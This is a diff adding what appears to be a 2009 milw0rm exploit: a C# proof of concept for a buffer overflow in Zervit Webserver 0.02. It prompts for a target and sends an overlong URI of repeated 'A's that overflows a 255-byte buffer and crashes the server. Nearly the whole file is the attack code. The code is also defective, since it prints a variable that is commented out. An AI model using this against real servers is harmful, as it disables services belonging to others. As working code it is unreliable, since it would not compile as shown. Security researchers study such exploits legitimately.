@@ -1,0 +1,50 @@
+####################  Zervit Webserver 0.02  Buffer Overflow   ############################
+
+
+############### By:      e.wiZz!
+
+###############Site:   www.balcansecurity.com
+
+
+############### Found with ServMeNot (world's sexiest fuzzer :P )
+
+
+
+In the wild...
+
+########################################################################################
+
+######Vend0r site: http://www.ohloh.net/projects/mereo
+
+
+/* When requested uri isn't found,it goes to char tmp[255],
+and later it is used to output,you need 256 chars to overflow (check source "http.c") */
+
+using System;
+using System.IO;
+using System.Net;
+using System.Text;
+
+class whatsoever
+{
+    static void Main()
+    {
+        // StringBuilder sb = new StringBuilder();
+
+        //byte[] buf = new byte[8192];
+
+        Console.WriteLine("Enter site: (http://localhost)");
+        string sajt = Console.ReadLine();
+        string uribad = "/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+        HttpWebRequest request = (HttpWebRequest)
+           
+            WebRequest.Create(sajt+uribad);
+
+        HttpWebResponse response = (HttpWebResponse)
+            request.GetResponse();
+        // you shouldn't see response
+        Console.WriteLine(sb.ToString());
+    }
+}
+
+// milw0rm.com [2009-04-15]
